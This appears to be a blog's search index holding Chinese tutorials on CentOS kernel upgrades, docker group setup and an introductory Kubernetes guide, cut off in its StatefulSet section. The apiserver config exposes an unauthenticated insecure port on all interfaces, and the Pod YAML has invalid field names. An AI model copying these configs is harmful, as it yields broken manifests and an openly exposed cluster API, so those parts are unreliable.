<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>centos更换内核</title>
    <link href="/2022/07/12/centos%E6%9B%B4%E6%8D%A2%E5%86%85%E6%A0%B8/"/>
    <url>/2022/07/12/centos%E6%9B%B4%E6%8D%A2%E5%86%85%E6%A0%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="centos更换内核"><a href="#centos更换内核" class="headerlink" title="centos更换内核"></a>centos更换内核</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org<span class="hljs-comment">#导入新版本的仓库密钥</span><br> <br>rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm<span class="hljs-comment">#下载最新版的仓库索引</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum --disablerepo=<span class="hljs-string">&quot;*&quot;</span> --enablerepo=<span class="hljs-string">&quot;elrepo-kernel&quot;</span> list available<span class="hljs-comment">#查找可用的内核</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum --enablerepo=elrepo-kernel install kernel-ml<span class="hljs-comment">#安装最新版的主线内核</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub2-mkconfig -o /boot/grub2/grub.cfg<span class="hljs-comment">#重新生成grub配置文件</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /boot/grub2/grub.cfg |grep menuentry<span class="hljs-comment">#查找可用的grub配置菜单参数</span><br>grub2-set-default <span class="hljs-string">&#x27;CentOS Linux (4.17.4-1.el7.elrepo.x86_64) 7 (Core)&#x27;</span><span class="hljs-comment">#设置默认的启动内核版本</span><br></code></pre></td></tr></table></figure><p>参考:<a href="https://blog.csdn.net/qq_38591756/article/details/82829398">https://blog.csdn.net/qq_38591756/article/details/82829398</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker配置非root用户使用</title>
    <link href="/2022/07/12/docker%E9%85%8D%E7%BD%AE%E9%9D%9Eroot%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/07/12/docker%E9%85%8D%E7%BD%AE%E9%9D%9Eroot%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="docker配置非root用户使用"><a href="#docker配置非root用户使用" class="headerlink" title="docker配置非root用户使用"></a>docker配置非root用户使用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupadd docker<br>usermod -aG docker <span class="hljs-variable">$&#123;USER&#125;</span><span class="hljs-comment">#</span><br><span class="hljs-comment">#重新登陆系统生效</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>kubernetes简单入门</title>
    <link href="/2022/07/12/kubernetes%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/12/kubernetes%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="kubernetes简单入门"><a href="#kubernetes简单入门" class="headerlink" title="kubernetes简单入门"></a>kubernetes简单入门</h1><h2 id="1-kubernetes是什么"><a href="#1-kubernetes是什么" class="headerlink" title="1.kubernetes是什么?"></a>1.kubernetes是什么?</h2><p>Kubernetes 是一个可移植、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态，其服务、支持和工具的使用范围相当广泛。</p><p><strong>Kubernetes</strong> 这个名字源于希腊语，意为“舵手”或“飞行员”。k8s 这个缩写是因为 k 和 s 之间有八个字符的关系。 Google 在 2014 年开源了 Kubernetes 项目。 Kubernetes 建立在<a href="https://research.google/pubs/pub43438">Google 大规模运行生产工作负载十几年经验</a>的基础上， 结合了社区中最优秀的想法和实践。</p><h2 id="2-kubernetes组件"><a href="#2-kubernetes组件" class="headerlink" title="2.kubernetes组件"></a>2.kubernetes组件</h2><h3 id="2-1-控制平面组件（Control-Plane-Components"><a href="#2-1-控制平面组件（Control-Plane-Components" class="headerlink" title="2.1.控制平面组件（Control Plane Components)"></a>2.1.控制平面组件（Control Plane Components)</h3><h5 id="2-1-1-kube-apiserver"><a href="#2-1-1-kube-apiserver" class="headerlink" title="2.1.1.kube-apiserver"></a>2.1.1.kube-apiserver</h5><p>API 服务器是 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 该组件负责公开了 Kubernetes API，负责处理接受请求的工作。 API 服务器是 Kubernetes 控制平面的前端。</p><p>Kubernetes API 服务器的主要实现是 <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-apiserver/">kube-apiserver</a>。 <code>kube-apiserver</code> 设计上考虑了水平扩缩，也就是说，它可通过部署多个实例来进行扩缩。 你可以运行 <code>kube-apiserver</code> 的多个实例，并在这些实例之间平衡流量。</p><h5 id="2-1-2-kube-scheduler"><a href="#2-1-2-kube-scheduler" class="headerlink" title="2.1.2.kube-scheduler"></a>2.1.2.kube-scheduler</h5><p><code>kube-scheduler</code> 是<a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 负责监视新创建的、未指定运行<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>的 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pods</a>， 并选择节点来让 Pod 在上面运行。</p><p>调度决策考虑的因素包括单个 Pod 及 Pods 集合的资源需求、软硬件及策略约束、 亲和性及反亲和性规范、数据位置、工作负载间的干扰及最后时限。</p><h5 id="2-1-3-kube-controller-manager"><a href="#2-1-3-kube-controller-manager" class="headerlink" title="2.1.3.kube-controller-manager"></a>2.1.3.kube-controller-manager</h5><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-controller-manager/">kube-controller-manager</a> 是<a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 负责运行<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/">控制器</a>进程。</p><p>从逻辑上讲， 每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/">控制器</a>都是一个单独的进程， 但是为了降低复杂性，它们都被编译到同一个可执行文件，并在同一个进程中运行。</p><p>这些控制器包括：</p><ul><li>节点控制器（Node Controller）：负责在节点出现故障时进行通知和响应</li><li>任务控制器（Job Controller）：监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成</li><li>端点控制器（Endpoints Controller）：填充端点（Endpoints）对象（即加入 Service 与 Pod）</li><li>服务帐户和令牌控制器（Service Account &amp; Token Controllers）：为新的命名空间创建默认帐户和 API 访问令牌</li></ul><h5 id="2-1-4-cloud-controller-manager"><a href="#2-1-4-cloud-controller-manager" class="headerlink" title="2.1.4.cloud-controller-manager"></a>2.1.4.cloud-controller-manager</h5><p><code>cloud-controller-manager</code> 是指嵌入特定云的控制逻辑之 <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>组件。 <code>cloud-controller-manager</code> 允许你将你的集群连接到云提供商的 API 之上， 并将与该云平台交互的组件同与你的集群交互的组件分离开来。</p><p><code>cloud-controller-manager</code> 仅运行特定于云平台的控制器。 因此如果你在自己的环境中运行 Kubernetes，或者在本地计算机中运行学习环境， 所部署的集群不需要有云控制器管理器。</p><p>与 <code>kube-controller-manager</code> 类似，<code>cloud-controller-manager</code> 将若干逻辑上独立的控制回路组合到同一个可执行文件中， 供你以同一进程的方式运行。 你可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。</p><p>下面的控制器都包含对云平台驱动的依赖：</p><ul><li>节点控制器（Node Controller）：用于在节点终止响应后检查云提供商以确定节点是否已被删除</li><li>路由控制器（Route Controller）：用于在底层云基础架构中设置路由</li><li>服务控制器（Service Controller）：用于创建、更新和删除云提供商负载均衡器</li></ul><h5 id="2-1-5-etcd"><a href="#2-1-5-etcd" class="headerlink" title="2.1.5.etcd"></a>2.1.5.etcd</h5><p><code>etcd</code> 是兼顾一致性与高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库。</p><p>你的 Kubernetes 集群的 <code>etcd</code> 数据库通常需要有个<a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/configure-upgrade-etcd/#backing-up-an-etcd-cluster">备份</a>计划。</p><p>如果想要更深入的了解 <code>etcd</code>，请参考 <a href="https://etcd.io/docs/">etcd 文档</a>。</p><h3 id="2-2-Node-组件"><a href="#2-2-Node-组件" class="headerlink" title="2.2.Node 组件"></a>2.2.Node 组件</h3><h5 id="2-2-1-kubelet"><a href="#2-2-1-kubelet" class="headerlink" title="2.2.1.kubelet"></a>2.2.1.kubelet</h5><p><code>kubelet</code> 会在集群中每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>上运行。 它保证<a href="https://kubernetes.io/zh-cn/docs/concepts/overview/what-is-kubernetes/#why-containers">容器（containers）</a>都运行在 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 中。</p><p>kubelet 接收一组通过各类机制提供给它的 PodSpecs， 确保这些 PodSpecs 中描述的容器处于运行状态且健康。 kubelet 不会管理不是由 Kubernetes 创建的容器。</p><h5 id="2-2-2-kube-proxy"><a href="#2-2-2-kube-proxy" class="headerlink" title="2.2.2.kube-proxy"></a>2.2.2.kube-proxy</h5><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-proxy/">kube-proxy</a> 是集群中每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>所上运行的网络代理， 实现 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/">服务（Service）</a> 概念的一部分。</p><p>kube-proxy 维护节点上的一些网络规则， 这些网络规则会允许从集群内部或外部的网络会话与 Pod 进行网络通信。</p><p>如果操作系统提供了可用的数据包过滤层，则 kube-proxy 会通过它来实现网络规则。 否则，kube-proxy 仅做流量转发。</p><h2 id="3-kubernetes的安装与部署-基于Centos7-9"><a href="#3-kubernetes的安装与部署-基于Centos7-9" class="headerlink" title="3.kubernetes的安装与部署(基于Centos7.9)"></a>3.kubernetes的安装与部署(基于Centos7.9)</h2><h5 id="1-部署master节点"><a href="#1-部署master节点" class="headerlink" title="1.部署master节点"></a>1.部署master节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装master节点</span><br>yum install -y etcd<span class="hljs-comment">#键值对数据库</span><br>yum install -y kubernetes-master<br><br><span class="hljs-comment">#配置apiserver配置文件</span><br><span class="hljs-comment">#-------/etc/kubernetes/apiserver</span><br>KUBE_API_ADDRESS=<span class="hljs-string">&quot;--insecure-bind-address=0.0.0.0&quot;</span><br><br><span class="hljs-comment"># The port on the local server to listen on.</span><br>KUBE_API_PORT=<span class="hljs-string">&quot;--port=8080&quot;</span><br><br><span class="hljs-comment"># Port minions listen on</span><br>KUBELET_PORT=<span class="hljs-string">&quot;--kubelet-port=10250&quot;</span><br><br><span class="hljs-comment"># Comma separated list of nodes in the etcd cluster</span><br>KUBE_ETCD_SERVERS=<span class="hljs-string">&quot;--etcd-servers=http://127.0.0.1:2379&quot;</span><br><br><span class="hljs-comment"># Address range to use for services</span><br>KUBE_SERVICE_ADDRESSES=<span class="hljs-string">&quot;--service-cluster-ip-range=10.254.0.0/16&quot;</span><br><br><span class="hljs-comment"># default admission control policies</span><br>KUBE_ADMISSION_CONTROL=<span class="hljs-string">&quot;--admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota&quot;</span><br><br><span class="hljs-comment"># Add your own!</span><br>KUBE_API_ARGS=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment">#配置/etc/kubernetes/config配置文件</span><br>KUBE_LOGTOSTDERR=<span class="hljs-string">&quot;--logtostderr=true&quot;</span><br><br><span class="hljs-comment"># journal message level, 0 is debug</span><br>KUBE_LOG_LEVEL=<span class="hljs-string">&quot;--v=0&quot;</span><br><br><span class="hljs-comment"># Should this cluster be allowed to run privileged docker containers</span><br>KUBE_ALLOW_PRIV=<span class="hljs-string">&quot;--allow-privileged=false&quot;</span><br><br><span class="hljs-comment"># How the controller-manager, scheduler, and proxy find the apiserver</span><br>KUBE_MASTER=<span class="hljs-string">&quot;--master=http://192.168.245.131:8080&quot;</span><br><br>systemctl start kube-apiserver.service<br>systemctl start kube-controller-manager.service<br>systemctl start kube-scheduler.service<br></code></pre></td></tr></table></figure><h5 id="2-部署node节点"><a href="#2-部署node节点" class="headerlink" title="2.部署node节点"></a>2.部署node节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y kubernetes-node<br><span class="hljs-comment">#编辑配置文件 /etc/kubernetes/kubelet</span><br><span class="hljs-comment"># kubernetes kubelet (minion) config</span><br><br><span class="hljs-comment"># The address for the info server to serve on (set to 0.0.0.0 or &quot;&quot; for all interfaces)</span><br>KUBELET_ADDRESS=<span class="hljs-string">&quot;--address=0.0.0.0&quot;</span><br><br><span class="hljs-comment"># The port for the info server to serve on</span><br><span class="hljs-comment"># KUBELET_PORT=&quot;--port=10250&quot;</span><br><br><span class="hljs-comment"># You may leave this blank to use the actual hostname</span><br>KUBELET_HOSTNAME=<span class="hljs-string">&quot;--hostname-override=k8s-node1&quot;</span><br><br><span class="hljs-comment"># location of the api-server</span><br>KUBELET_API_SERVER=<span class="hljs-string">&quot;--api-servers=http://192.168.245.131:8080&quot;</span><br><br><span class="hljs-comment"># pod infrastructure container</span><br>KUBELET_POD_INFRA_CONTAINER=<span class="hljs-string">&quot;--pod-infra-container-image=registry.access.redhat.com/rhel7/pod-infrastructure:latest&quot;</span><br><br><span class="hljs-comment"># Add your own!</span><br>KUBELET_ARGS=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#/etc/kubernetes/config</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment"># kubernetes system config</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The following values are used to configure various aspects of all</span><br><span class="hljs-comment"># kubernetes services, including</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   kube-apiserver.service</span><br><span class="hljs-comment">#   kube-controller-manager.service</span><br><span class="hljs-comment">#   kube-scheduler.service</span><br><span class="hljs-comment">#   kubelet.service</span><br><span class="hljs-comment">#   kube-proxy.service</span><br><span class="hljs-comment"># logging to stderr means we get it in the systemd journal</span><br>KUBE_LOGTOSTDERR=<span class="hljs-string">&quot;--logtostderr=true&quot;</span><br><br><span class="hljs-comment"># journal message level, 0 is debug</span><br>KUBE_LOG_LEVEL=<span class="hljs-string">&quot;--v=0&quot;</span><br><br><span class="hljs-comment"># Should this cluster be allowed to run privileged docker containers</span><br>KUBE_ALLOW_PRIV=<span class="hljs-string">&quot;--allow-privileged=false&quot;</span><br><br><span class="hljs-comment"># How the controller-manager, scheduler, and proxy find the apiserver</span><br>KUBE_MASTER=<span class="hljs-string">&quot;--master=http://192.168.245.131:8080&quot;</span><br></code></pre></td></tr></table></figure><p><strong>在配置kubernetes时一定要关闭swap,不然会导致服务访问缓慢</strong></p><h5 id="3-kubernetes的网络插件flunnel"><a href="#3-kubernetes的网络插件flunnel" class="headerlink" title="3.kubernetes的网络插件flunnel"></a>3.kubernetes的网络插件flunnel</h5><p>flunnel是kubernetes的节点网络插件,主要借助TUN&#x2F;TAP原理用于不同的节点之间进行通信,flannel中网络地址的分配是由etcd来维护的</p><h2 id="4-kubernetes的资源对象"><a href="#4-kubernetes的资源对象" class="headerlink" title="4.kubernetes的资源对象"></a>4.kubernetes的资源对象</h2><ul><li>pod</li><li>ReplicationController</li><li>ReplicaSet</li><li>Deployment</li><li>StatefulSet</li><li>Service</li><li>Ingress</li></ul><h5 id="4-1-pod"><a href="#4-1-pod" class="headerlink" title="4.1.pod"></a>4.1.pod</h5><p><em>Pod</em> 是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元,一个pod包含一个或多个容器(其中至少包含一个基础容器pause),其他一个或者多个业务容器和基础容器共享存储和网络,并且Pod 中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。</p><h6 id="如何创建一个pod"><a href="#如何创建一个pod" class="headerlink" title="如何创建一个pod?"></a>如何创建一个pod?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:alpine</span><br>      <span class="hljs-attr">imagePullPolicy:</span>  <span class="hljs-string">IfNotPresent</span><br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">names:</span> <span class="hljs-string">ubuntu</span><br>      <span class="hljs-attr">PullPolicy:</span>  <span class="hljs-string">IfNotPresent</span><br>      <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;bin/bash&quot;</span>]<br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">81</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f config.yaml <span class="hljs-comment">#创建一个pod</span><br></code></pre></td></tr></table></figure><h5 id="4-2-ReplicationController"><a href="#4-2-ReplicationController" class="headerlink" title="4.2.ReplicationController"></a>4.2.ReplicationController</h5><p><em>ReplicationController</em> 是一组pod的控制器,确保在任何时候都有特定数量的 Pod 副本处于运行状态。 换句话说，ReplicationController 确保一个 Pod 或一组同类的 Pod 总是可用的。</p><h6 id="ReplicationController-如何工作"><a href="#ReplicationController-如何工作" class="headerlink" title="ReplicationController 如何工作?"></a>ReplicationController 如何工作?</h6><p>当 Pod 数量过多时，ReplicationController 会终止多余的 Pod。当 Pod 数量太少时，ReplicationController 将会启动新的 Pod。 与手动创建的 Pod 不同，由 ReplicationController 创建的 Pod 在失败、被删除或被终止时会被自动替换。 例如，在中断性维护（如内核升级）之后，你的 Pod 会在节点上重新创建。 因此，即使你的应用程序只需要一个 Pod，你也应该使用 ReplicationController 创建 Pod。 ReplicationController 类似于进程管理器，但是 ReplicationController 不是监控单个节点上的单个进程，而是监控跨多个节点的多个 Pod。</p><p>在讨论中，ReplicationController 通常缩写为 “rc”，并作为 kubectl 命令的快捷方式。</p><p>一个简单的示例是创建一个 ReplicationController 对象来可靠地无限期地运行 Pod 的一个实例。 更复杂的用例是运行一个多副本服务（如 web 服务器）的若干相同副本。</p><h6 id="如何创建一个rc"><a href="#如何创建一个rc" class="headerlink" title="如何创建一个rc?"></a>如何创建一个rc?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ReplicationController</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><span class="hljs-comment">#标签选择器RC只会去管理和维护标签相对应的pod</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span> <span class="hljs-comment">#标签一定要和selector相对应</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h5 id="4-3-ReplicaSet"><a href="#4-3-ReplicaSet" class="headerlink" title="4.3.ReplicaSet"></a>4.3.ReplicaSet</h5><p><em>ReplicaSet</em> 是ReplicationController的升级版,其目的是维护一组在任何时候都处于运行状态的 Pod 副本的稳定集合。 因此，它通常用来保证给定数量的、完全相同的 Pod 的可用性。</p><h6 id="和ReplicationController的区别"><a href="#和ReplicationController的区别" class="headerlink" title="和ReplicationController的区别"></a>和ReplicationController的区别</h6><p>ReplicaSet支持集合的selector</p><h6 id="如何创建一个ReplicaSet"><a href="#如何创建一个ReplicaSet" class="headerlink" title="如何创建一个ReplicaSet"></a>如何创建一个ReplicaSet</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ReplicaSet</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">frontend</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">guestbook</span><br>    <span class="hljs-attr">tier:</span> <span class="hljs-string">frontend</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-comment"># 按你的实际情况修改副本数</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span> <span class="hljs-comment">#匹配标签</span><br>      <span class="hljs-attr">tier:</span> <span class="hljs-string">frontend</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">tier:</span> <span class="hljs-string">frontend</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">php-redis</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">gcr.io/google_samples/gb-frontend:v3</span><br></code></pre></td></tr></table></figure><h5 id="4-4-Deployment"><a href="#4-4-Deployment" class="headerlink" title="4.4.Deployment"></a>4.4.Deployment</h5><p><em>Deployment</em>为 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 和 <a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/replicaset/">ReplicaSet</a> 提供声明式的更新能力,Deployment在创建时会创建ReplicaSet,Deployment通过控制ReplicaSet,通过ReplicaSet管理实际的pod,使用Deployment而不直接使用ReplicaSet或者ReplicationController的原因是Deployment提供资源的滚动更新和回滚.</p><h6 id="如何创建一个Deployment"><a href="#如何创建一个Deployment" class="headerlink" title="如何创建一个Deployment?"></a>如何创建一个Deployment?</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-deployment</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.14.2</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h5 id="4-5-StatefulSet"><a href="#4-5-StatefulSet" class="headerlink" title="4.5.StatefulSet"></a>4.5.StatefulSet</h5><p>StatefulSet 是用来管理有状态应用的工作负载 API 对象,StatefulSet 用来管理某 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 集合的部署和扩缩， 并为这些 Pod 提供持久存储和持久标识符。</p><p>和 <a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/deployment/">Deployment</a> 类似， 